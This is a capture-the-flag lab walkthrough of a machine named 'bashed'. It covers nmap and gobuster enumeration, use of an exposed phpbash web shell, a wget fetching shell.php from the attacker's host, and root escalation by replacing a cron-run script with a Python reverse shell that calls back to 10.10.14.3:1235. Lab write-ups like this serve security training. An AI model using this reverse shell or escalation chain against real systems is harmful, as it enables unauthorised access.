@@ -1,0 +1,138 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.68
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 22:09 EDT
+Nmap scan report for 10.10.10.68
+Host is up (0.16s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+
+
+
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.68
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 22:10 EDT
+Warning: 10.10.10.68 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.68 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.68
+Host is up (0.16s latency).
+Not shown: 990 open|filtered ports, 804 closed ports, 205 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.68 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.68
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/16 22:14:08 Starting gobuster
+===============================================================
+/images (Status: 301)
+/uploads (Status: 301)
+/php (Status: 301)
+/css (Status: 301)
+/dev (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/server-status (Status: 403)
+
+
+in /dev, it's the phpbash
+http://10.10.10.68/dev/phpbash.php
+
+
+www-data@bashed
+:/var/www/html/dev# which wget
+
+/usr/bin/wget
+www-data@bashed
+:/var/www/html/dev#
+
+www-data@bashed
+:/var/www/html/dev# wget http://10.10.14.3/shell.php
+
+--2020-07-16 19:33:15-- http://10.10.14.3/shell.php
+Connecting to 10.10.14.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 92 [text/html]
+shell.php: Permission denied
+
+Cannot write to 'shell.php' (Success).
+www-data@bashed
+:/var/www/html/dev#
+
+www-data@bashed
+:/var/www/html/dev# ls -al
+
+total 28
+drw-r-xr-x 2 root root 4096 Dec 4 2017 .
+drw-r-xr-x 10 root root 4096 Dec 4 2017 ..
+-rw-r-xr-x 1 root root 4688 Dec 4 2017 phpbash.min.php
+-rw-r-xr-x 1 root root 8280 Nov 30 2017 phpbash.php
+
+we can't write to it
+but we can write to uploads
+drwxrwxrwx 2 root root 4096 Jul 16 14:38 uploads
+
+add a reverse shell
+
+and get into the server
+
+python -c "import pty; pty.spawn('/bin/bash');"
+ctrl-z
+
+stty raw -echo
+fg
+
+we find out the by sudo -l 
+
+it can run any command under scriptmanager
+and there's a /scripts under that user
+let's change to that
+
+sudo -u scriptmanager /bin/bash
+by looking at the files, seems like it's running from test.py and write to the test.txt
+but that txt is owned by root, which means the test.py is running from root
+
+let's change that to python reverse shell
+
+
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.3",1235))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+kali@kali:/var/www/html$ nc -nlvp 1235
+listening on [any] 1235 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.68] 48388
+/bin/sh: 0: can't access tty; job control turned off
+# 
+
+# # ls -al
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Jul 16 20:24 .
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager  213 Jul 16 20:24 test.py
+-rw-r--r--  1 root          root            12 Jul 16 12:28 test.txt
+# whoami
+root
+
+root@bashed:~# crontab -l
+crontab -l
+* * * * * cd /scripts; for f in *.py; do python "$f"; done
+
+it's indeed has a cron to call that script as root
+
